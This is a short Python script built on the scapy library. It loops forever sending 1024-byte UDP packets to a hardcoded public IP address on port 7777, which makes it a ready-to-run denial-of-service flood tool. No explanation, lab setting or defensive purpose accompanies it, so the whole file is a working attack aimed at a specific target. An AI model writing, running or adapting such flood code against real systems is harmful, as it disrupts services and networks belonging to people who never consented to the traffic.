from scapy.all import *

target_ip = "164.92.234.227"
target_port = 7777

def udp_flood(target_ip, target_port):
    while True:
        packet = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="A"*1024)
        send(packet, verbose=0)

udp_flood(target_ip, target_port)
